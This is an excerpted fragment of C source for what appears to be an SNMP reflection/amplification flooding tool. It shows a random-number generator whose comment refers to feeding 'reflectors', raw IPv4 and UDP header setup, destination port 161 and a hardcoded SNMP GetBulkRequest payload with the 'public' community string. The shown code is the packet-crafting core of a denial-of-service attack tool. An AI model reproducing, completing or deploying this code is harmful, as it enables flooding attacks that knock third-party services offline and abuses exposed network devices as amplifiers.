...
{
	int i; /* completely copied from laertes cos i knew rand() was not gonna work */
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
...
uint32_t rand_cmwc(void)        /* changed the size of the sub-unit, we want our reflectors to get all the juice */
{
...
void setup_ip_header(struct iphdr *iph)
{
	...
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 34; /* we set the payload length as an individual integer as sizeof() is NOT reliable */
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
...
void setup_udp_header(struct udphdr *udph) // setup our little cutie 
{
    ...
    */
	...
	udph->dest = htons(161);
	udph->check = 0;
	memcpy((void *)udph + sizeof(struct udphdr), "\x30\x20\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x13\x02\x02\x00\x01\x02\x01\x00\x02\x01\x46\x30\x07\x30\x05\x06\x01\x28\x05\x00", 34);
